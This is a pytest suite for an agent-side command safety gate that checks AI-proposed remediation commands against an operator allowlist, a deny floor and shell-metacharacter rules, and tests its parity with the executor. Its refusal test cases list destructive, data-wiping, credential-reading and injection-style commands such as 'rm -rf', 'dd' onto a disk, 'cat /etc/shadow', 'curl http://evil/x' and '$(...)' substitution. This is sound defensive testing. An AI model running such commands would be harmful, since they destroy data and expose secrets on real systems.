"""node_action_plan: the agent-side twin of the executor's safety gate.

The plan stamped into the change record at open() has to be the same shape the
executor will run after approval, so these tests cover both the gate itself and
its parity with ``executor/nodeaction.py`` — a widened allowlist on one side
only is the failure mode that lets an approved record run something the
reviewer never saw.
"""

import importlib.util
import re
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import node_action_plan
from node_action_plan import (
    build_command_prompt, normalize_plan, parse_command_plan, validate_command,
    validate_plan,
)


def _load_executor_nodeaction():
    """Import executor/nodeaction.py under a private name (both trees ship a
    top-level ``nodeaction``/``entrypoint``, so a bare import would collide)."""
    path = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "executor", "nodeaction.py",
    )
    spec = importlib.util.spec_from_file_location("_executor_nodeaction_for_parity", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_executor = _load_executor_nodeaction()


def _ceiling_from_chart(key: str) -> frozenset:
    """The shipped ceiling, read out of charts/cfoperator/templates/configmap.yaml.

    DERIVED, not copied (CFOP-133 review). A hand-kept copy here would be the
    fourth-copy problem again one layer over: the chart and the test data would
    agree only until someone edited one, and a chart edge adding `journalctl`
    would fail nothing. The chart is a Helm template so it is not valid YAML;
    the two lists are plain inline sequences, which is all this needs to read.
    """
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    path = os.path.join(root, "charts", "cfoperator", "templates", "configmap.yaml")
    with open(path, encoding="utf-8") as fh:
        text = fh.read()
    m = re.search(rf"^\s*{re.escape(key)}:\s*\[([^\]]*)\]", text, re.MULTILINE)
    assert m, f"{key} not found in the chart -- the shipped ceiling moved or was removed"
    return frozenset(t.strip() for t in m.group(1).split(",") if t.strip())


_ALLOW_B = _ceiling_from_chart("allow_binaries")
_ALLOW_V = _ceiling_from_chart("allow_systemctl_verbs")
# The chart is the source, so guard it rather than the copy: an edit that
# empties either list would otherwise make every test below vacuously pass.
assert "systemctl" in _ALLOW_B and len(_ALLOW_B) >= 5
assert "restart" in _ALLOW_V and len(_ALLOW_V) >= 5
_ALLOW = node_action_plan.AllowList(_ALLOW_B, _ALLOW_V, 4)


# ---- the safety gate ---------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "chmod 600 /root/.ssh/config",
    "chown root:root /etc/cfop/config.yaml",
    "chgrp docker /var/run/docker.sock",
    "install -d -m 0750 /etc/cfop",
    "touch /etc/cfop/.keep",
    "ln -s /etc/foo /etc/bar",
    "mkdir -p /etc/cfop",
    "restorecon -R /etc/ssh",
    "chattr +i /etc/resolv.conf",
    "sudo -n chmod 0600 /root/.ssh/config",
    "systemctl restart sshd",
    "systemctl reload nginx",
    "systemctl reload-or-restart nginx",
    "systemctl daemon-reload",
    "systemctl is-active sshd",
    "sudo -n systemctl enable sshd",
])
def test_validate_command_allows_safe(cmd):
    ok, reason = validate_command(cmd, _ALLOW)
    assert ok, reason


@pytest.mark.parametrize("cmd,needle", [
    ("rm -rf /root/.ssh", "denied"),
    ("dd if=/dev/zero of=/dev/sda", "denied"),
    ("reboot", "denied"),
    ("kill 1234", "denied"),
    ("mv /etc/a /etc/b", "denied"),
    ("curl http://evil/x", "denied"),
    ("sed -i s/a/b/ /etc/hosts", "denied"),
    ("cat /etc/shadow", "allowlist"),
    ("chmod 600 /a && rm -rf /b", "metacharacter"),
    ("chmod 600 /a; reboot", "metacharacter"),
    ("chmod 600 /a | tee /b", "metacharacter"),
    ("chmod 600 $(cat /etc/x)", "metacharacter"),
    ("chmod 600 /etc/ssh/*", "metacharacter"),
    ("chmod 600 ~/x", "metacharacter"),
    ("chmod 600 /a > /b", "metacharacter"),
    ("chmod 600 /a\nreboot", "metacharacter"),
    ("systemctl stop sshd", "verb not allowed"),
    ("systemctl mask sshd", "verb not allowed"),
    ("systemctl", "verb not allowed"),
    ("sudo chmod 600 /a", "sudo -n"),
    ("sudo -S chmod 600 /a", "sudo -n"),
    ("sudo -n", "sudo -n"),
    ("", "empty"),
    ("   ", "empty"),
])
def test_validate_command_refuses_unsafe(cmd, needle):
    ok, reason = validate_command(cmd, _ALLOW)
    assert not ok
    assert needle in reason


def test_validate_command_handles_none():
    ok, reason = validate_command(None, _ALLOW)
    assert not ok and "empty" in reason


def test_validate_command_refuses_unparseable_quotes():
    ok, reason = validate_command("chmod 600 '/etc/unclosed", _ALLOW)
    assert not ok
    assert "unparseable" in reason


class TestValidatePlan:
    def test_accepts_plan_at_the_limit(self):
        ok, reason = validate_plan(["chmod 600 /a"] * 4, _ALLOW)
        assert ok, reason

    def test_rejects_too_many(self):
        ok, reason = validate_plan(["chmod 600 /a"] * 5, _ALLOW)
        assert not ok and "too many" in reason

    def test_rejects_empty(self):
        ok, reason = validate_plan([], _ALLOW)
        assert not ok and "no commands" in reason

    def test_rejects_when_any_command_is_unsafe(self):
        ok, reason = validate_plan(["chmod 600 /a", "rm -rf /b"], _ALLOW)
        assert not ok and "denied" in reason


# ---- plan parsing ------------------------------------------------------------

class TestParseCommandPlan:
    def test_bare_json(self):
        plan = parse_command_plan('{"host": "web1", "commands": ["chmod 600 /a"], "explanation": "fix perms"}')
        assert plan == {"host": "web1", "commands": ["chmod 600 /a"], "explanation": "fix perms"}

    def test_fenced_json(self):
        reply = 'Sure!\n```json\n{"host": "web1", "commands": ["chmod 600 /a"]}\n```\nHope that helps.'
        assert parse_command_plan(reply)["commands"] == ["chmod 600 /a"]

    def test_fenced_without_language_tag(self):
        reply = '```\n{"host": "", "commands": []}\n```'
        assert parse_command_plan(reply) == {"host": "", "commands": []}

    def test_prose_around_bare_json(self):
        reply = 'Here is the plan: {"commands": ["mkdir -p /etc/cfop"]} — run it after approval.'
        assert parse_command_plan(reply)["commands"] == ["mkdir -p /etc/cfop"]

    @pytest.mark.parametrize("reply", [
        "",
        None,
        "no json here at all",
        "} {",                              # closing brace before opening
        "{not valid json}",
        '["chmod 600 /a"]',                 # a list, not an object
        '{"host": "web1"}',                 # no commands key
        '{"commands": "chmod 600 /a"}',     # commands not a list
        '{"commands": ["chmod 600 /a", 7]}',  # non-string command
    ])
    def test_rejects_unusable_replies(self, reply):
        assert parse_command_plan(reply) is None

    def test_bare_json_uses_outermost_braces(self):
        reply = 'text {"commands": ["chmod 600 /a"], "nested": {"k": "v"}} tail'
        plan = parse_command_plan(reply)
        assert plan["nested"] == {"k": "v"}


class TestNormalizePlan:
    def test_full_plan(self):
        assert normalize_plan({
            "host": " web1 ",
            "commands": ["chmod 600 /a"],
            "explanation": "fix perms",
        }) == {"host": "web1", "commands": ["chmod 600 /a"], "explanation": "fix perms"}

    def test_missing_fields_become_empty(self):
        assert normalize_plan({}) == {"host": "", "commands": [], "explanation": ""}

    def test_none_host_and_commands_coerced(self):
        assert normalize_plan({"host": None, "commands": None, "explanation": None}) == {
            "host": "", "commands": [], "explanation": "",
        }

    def test_non_string_commands_stringified(self):
        assert normalize_plan({"commands": [7, None]})["commands"] == ["7", "None"]


class TestBuildCommandPrompt:
    def test_includes_recommendation_and_target(self):
        prompt = build_command_prompt({
            "payload": {
                "recommendation": "tighten ssh config perms",
                "target": {"host": "web1", "path": "/root/.ssh/config"},
                "rendered_context": "sshd refuses to start",
            }
        }, _ALLOW)
        assert "tighten ssh config perms" in prompt
        assert '"host": "web1"' in prompt
        assert "sshd refuses to start" in prompt

    def test_rules_are_generated_from_the_effective_allowlist(self):
        """The drift guard (CFOP-133).

        Both copies of this prompt used to spell the list out by hand and both
        had drifted from the gate beside them -- 5 systemctl verbs named where
        9 were accepted, 8 denied binaries named out of 33. Worse, once the
        list is operator-configurable a hand-written prompt breaks the dial:
        a binary added in the console is accepted by the gate but never
        offered to the model, so the change appears to do nothing.
        """
        prompt = build_command_prompt({}, _ALLOW)
        for verb in _ALLOW_V:
            assert verb in prompt, f"prompt does not offer allowed verb {verb}"
        for binary in _ALLOW_B:
            assert binary in prompt, f"prompt does not offer allowed binary {binary}"
        # and a narrowed list must produce a narrowed prompt
        narrow = build_command_prompt(
            {}, node_action_plan.AllowList(frozenset({"systemctl"}),
                                           frozenset({"restart"}), 2))
        assert "chmod" not in narrow
        assert "daemon-reload" not in narrow
        assert "at most 2 command" in narrow

    def test_an_unconfigured_allowlist_says_so_rather_than_listing_nothing(self):
        # A prompt that silently omits the rule reads to the model as "no
        # restriction". Say it out loud instead.
        prompt = build_command_prompt(
            {}, node_action_plan.AllowList(frozenset(), frozenset(), 4))
        assert "every command will be refused" in prompt
        assert '"commands"' in prompt  # the requested reply shape

    def test_context_truncated(self):
        prompt = build_command_prompt({"payload": {"rendered_context": "x" * 9000}}, _ALLOW)
        assert "x" * 4000 in prompt
        assert "x" * 4001 not in prompt

    def test_tolerates_missing_payload(self):
        assert "Recommendation:" in build_command_prompt({}, _ALLOW)


# ---- parity with the executor ------------------------------------------------

class TestExecutorParity:
    """``node_action_plan`` mirrors ``executor/nodeaction.py``.

    REWRITTEN by CFOP-133. This used to assert the two modules held identical
    allowlist LITERALS. Neither holds one any more: the agent resolves the list
    from config and hands it to the executor in the Job env, and both sides
    enforce only what they were given. So parity is now behavioural — given the
    same AllowList the two gates must reach the same verdict — plus the two
    properties that replace the old literal check: neither module has a
    built-in allowlist to fall back to, and both still carry the same floor.
    """

    def test_neither_module_has_a_built_in_allowlist(self):
        # The whole point of CFOP-133. A module-level allow set anywhere is a
        # list an operator cannot change and an executor could silently prefer.
        for mod in (node_action_plan, _executor):
            for name in ("_ALLOWED_BINARIES", "_ALLOWED_SYSTEMCTL_VERBS", "_MAX_COMMANDS"):
                assert not hasattr(mod, name), f"{mod.__name__} still hardcodes {name}"

    @pytest.mark.parametrize("name", ["_DENY_BINARIES"])
    def test_the_floor_still_matches(self, name):
        # The floor stays hardcoded in both, and identical: it is the one thing
        # config must never be able to move.
        assert getattr(node_action_plan, name) == getattr(_executor, name)

    def test_metachar_pattern_matches(self):
        assert node_action_plan._METACHARS.pattern == _executor._METACHARS.pattern

    @pytest.mark.parametrize("cmd", [
        "chmod 600 /root/.ssh/config",
        "sudo -n systemctl restart sshd",
        "sudo -n systemctl daemon-reload",
        "rm -rf /",
        "systemctl stop sshd",
        "chmod 600 /a && reboot",
        "journalctl -u sshd",
        "",
    ])
    def test_verdicts_agree_given_the_same_allowlist(self, cmd):
        allow_a = node_action_plan.AllowList(_ALLOW_B, _ALLOW_V, 4)
        allow_e = _executor.AllowList(_ALLOW_B, _ALLOW_V, 4)
        assert (validate_command(cmd, allow_a)[0]
                == _executor.validate_command(cmd, allow_e)[0])

    @pytest.mark.parametrize("cmd", ["chmod 600 /a", "sudo -n systemctl restart sshd"])
    def test_both_refuse_everything_when_unconfigured(self, cmd):
        # An empty allowlist is the shape an install that declared nothing gets,
        # and the shape an executor newer than its agent gets. Both must refuse.
        #
        # The refusal is doubly assured, deliberately: the explicit `configured`
        # check, and the membership test that an empty set fails anyway. So this
        # asserts the REASON too -- the verdict alone survives deleting the
        # explicit check, and "binary not in allowlist: chmod" would send an
        # operator hunting for a typo instead of a missing config block.
        empty_a = node_action_plan.AllowList(frozenset(), frozenset(), 4)
        empty_e = _executor.AllowList(frozenset(), frozenset(), 4)
        for ok, reason in (validate_command(cmd, empty_a),
                           _executor.validate_command(cmd, empty_e)):
            assert ok is False
            assert "no allowlist configured" in reason
            assert "allow_binaries" in reason

    def test_neither_can_widen_past_what_it_was_handed(self):
        # A binary absent from the handed list is refused even though it is a
        # perfectly ordinary admin tool and appears in no deny list.
        narrow = frozenset({"systemctl"})
        allow_a = node_action_plan.AllowList(narrow, _ALLOW_V, 4)
        allow_e = _executor.AllowList(narrow, _ALLOW_V, 4)
        assert validate_command("chmod 600 /a", allow_a)[0] is False
        assert _executor.validate_command("chmod 600 /a", allow_e)[0] is False

    def test_the_floor_outranks_the_allowlist(self):
        # rm named in the allowlist is still refused -- config cannot reach the
        # floor. This is the guard that keeps the ceiling from becoming a hole.
        rogue = frozenset({"rm", "chmod"})
        allow_a = node_action_plan.AllowList(rogue, _ALLOW_V, 4)
        allow_e = _executor.AllowList(rogue, _ALLOW_V, 4)
        assert validate_command("rm -rf /", allow_a)[0] is False
        assert _executor.validate_command("rm -rf /", allow_e)[0] is False


# ---- the shipped ceiling itself ---------------------------------------------

class TestShippedCeiling:
    """Guards on charts/cfoperator/templates/configmap.yaml, the single source.

    Deriving the fixtures above from the chart removes the drift the review
    flagged -- there is no second copy left to disagree with it. What deriving
    cannot do is notice that the ceiling CHANGED, so these assert the
    properties a ceiling must hold whatever it lists. Widening it by one
    ordinary binary is deliberately a reviewable chart diff rather than a test
    failure; widening it into the floor is not reviewable, it is a bug.
    """

    def test_the_ceiling_never_names_a_denied_binary(self):
        # A chart edit adding rm/curl/dd would be refused at runtime by the
        # floor, but silently: the operator would see it offered in the console
        # and never work. Fail the build instead.
        overlap = _ALLOW_B & node_action_plan._DENY_BINARIES
        assert not overlap, f"shipped ceiling names denied binaries: {sorted(overlap)}"

    def test_every_binary_in_the_ceiling_is_actually_usable(self):
        # Each entry must pass the gate in a plausible command; an entry the
        # gate can never accept is dead config that misleads the operator.
        for binary in _ALLOW_B:
            cmd = f"systemctl restart sshd" if binary == "systemctl" else f"{binary} /tmp/x"
            ok, reason = validate_command(cmd, _ALLOW)
            assert ok, f"{binary} is in the ceiling but the gate refuses it: {reason}"

    def test_the_ceiling_grants_no_systemctl_verb_that_stops_things(self):
        # The list is for restoring service, not withdrawing it. stop/disable/
        # mask/kill belong to a human.
        forbidden = {"stop", "disable", "mask", "kill"} & _ALLOW_V
        assert not forbidden, f"ceiling grants withdrawal verbs: {sorted(forbidden)}"
